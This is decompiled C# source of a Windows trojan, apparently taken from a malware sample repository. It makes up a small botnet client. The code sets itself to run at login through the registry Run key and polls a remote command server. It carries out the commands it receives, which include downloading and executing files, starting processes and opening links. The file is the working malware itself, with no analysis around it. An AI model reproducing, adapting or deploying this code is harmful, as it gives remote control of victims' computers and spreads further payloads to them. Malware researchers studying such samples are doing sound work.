// Decompiled with JetBrains decompiler
// Type: botnet.Program
// Assembly: Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 26B2C5E8-B1C8-4438-82DF-D74DF4D4264C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan.Win32.Agent.xaoljm-d212376ea840595276df0948db541783847fc983f58250042bef85634ce5c7ea.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;

namespace botnet
{
  internal class Program
  {
    private static string last_cmd = string.Empty;

    private static void SetStartup() => Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Update", (object) Assembly.GetExecutingAssembly().Location);

    private static void Main(string[] args)
    {
      IPAddress.Parse(new WebClient().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "").Trim());
      while (true)
      {
        Program.SetStartup();
        string input_content = Regex.Match(web.GetHTML(configs.server), "<p>(.*)</p></article>").Groups[1].Value;
        if (Program.last_cmd == input_content)
        {
          Thread.Sleep(configs.delay);
        }
        else
        {
          Program.last_cmd = input_content;
          Program.Execute(new cmd(input_content));
          Thread.Sleep(configs.delay);
        }
      }
    }

    private static void Execute(cmd CMD)
    {
      string comType = CMD.ComType;
      if (!(comType == "open_link"))
      {
        if (!(comType == "download_execute"))
        {
          if (!(comType == "run_process"))
          {
            if (!(comType == "exit"))
              return;
            Environment.Exit(0);
          }
          else
          {
            try
            {
              Process.Start(CMD.ComContent);
            }
            catch
            {
            }
          }
        }
        else
          functions.DownloadExecute(CMD.ComContent);
      }
      else
        functions.OpenLink(CMD.ComContent);
    }
  }
}
